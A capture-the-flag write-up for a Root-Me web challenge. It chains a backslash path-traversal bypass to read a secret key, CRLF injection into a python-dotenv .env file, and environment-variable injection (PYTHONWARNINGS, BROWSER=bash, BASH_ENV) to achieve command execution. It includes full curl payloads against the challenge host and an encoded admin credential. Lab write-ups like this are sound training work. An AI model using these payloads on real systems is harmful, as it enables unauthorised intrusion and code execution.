Analysing the source code I found out - 

downlaod.py 
```        if '/' in filename:
            # Prevent linux path traversal
            safe_filename = filename[filename.rindex('/') + 1:]

        if '\\' in filename:
            # Prevent windows path traversal
            safe_filename = filename[filename.rindex('\\') + 1:]
```
We know that the .secret_key is in /app 

secret.py
```
    key_file: str = ".secret_key"
```

I can read the admin secret by bypassing the checks by sending this request - 

`curl -k $'http://challenge01.root-me.org:59095/read?file=\\../.secret_key'`


I logged as admin and found out it sets two environment variables MAIL_ADMIN and API_URL from user input

From this website -  https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection

I was able to figure out multiple ways to inject environment variables into .env but there were some complications here - 
1. perlthanks was not available on the server ( verified by creating a local docker container and searching for perlthanks )
2. For inserting environment variables, I needed to perform CRLF injection which according to me was the most tricky part here. 

For solving the 1st problem- 
I did some research and found out that the `import antigravity` uses a BROWSER env variable, if I were to use BROWSER=perlthanks, it would invoke the perl interpreter and that's when it would also take in the PERL5OPT env variable, but I found a way to bypass this entire step by using BROWSER=bash and BASH_ENV=$( command ) and I would achieve the same Code Execution. So these are the environment variables I tried to inject - 

`docker run -e 'PYTHONWARNINGS=all:0:antigravity.x:0:0' -e 'BROWSER=bash' -e 'BASH_ENV=$(id > /tmp/pwned)' python:3.8-slim-buster python /dev/null`

This was the bypass I found for performing Code Execution

For solving the 2nd problem- 
This was the most tricky part for me, I was stuck on this one for at least 3 days and after testing multiple payloads inside my docker container, by manually testing each payload using the python-dotenv/src/dotenv/parser.py 

```
import io
from parser import parse_stream

def test(raw_env_content):
    for binding in parse_stream(io.StringIO(raw_env_content)):
        print(binding)
```

This one finally worked - 
```
test('''MAIL_ADMIN='x\\'
... API_URL='
... PYTHONWARNINGS=all:0:antigravity.x:0:0
... BROWSER=bash
... BASH_ENV=$(id > /tmp/pwned)'
... ''')
```

Now the final stage of the exploit was to deliver it to the server and this was the final payload - 
```
curl 'http://challenge01.root-me.org:59095/admin/update' \
    -X POST \
    -H 'Authorization: Basic YWRtaW46dlY1eGYxRDZ0ZGxrMlNhbmpLZUJIbHZidFhCeHRQc25CbTJaWEdBQg==' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode $'mail=x\\' \
    --data-urlencode $'api_url=\nPYTHONWARNINGS=all:0:antigravity.x:0:0\nBROWSER=bash\nBASH_ENV=$(cat /app/flag-*.txt > /tmp/pwned)'
```

and send a request to test_mail to execute our malicious env variables - 
```
curl 'http://challenge01.root-me.org:59095/admin/test-mail' \
  -H 'Authorization: Basic YWRtaW46dlY1eGYxRDZ0ZGxrMlNhbmpLZUJIbHZidFhCeHRQc25CbTJaWEdBQg=='
```

Finally, retrieve the flag using the local file read vulnerability I found earlier
```
curl -k $'http://challenge01.root-me.org:59095/read?file=\\../../tmp/pwned' 
```

A challenge like this is born under a blue moon and dies at dawn.
